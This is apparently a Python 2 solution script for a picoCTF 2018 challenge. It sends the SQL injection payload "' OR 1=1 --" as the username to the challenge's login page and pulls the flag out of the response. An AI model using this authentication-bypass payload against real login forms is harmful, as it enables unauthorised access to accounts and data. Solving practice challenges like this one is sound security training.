#!/usr/bin/python

import requests
import re

params = {'username': "' OR 1=1 --", 'password': '', 'debug': 0}

r = requests.post('http://2018shell1.picoctf.com:59464/login.php', data=params)
source = r.text
print re.findall(r'(picoCTF\{.+\})', source)[0]
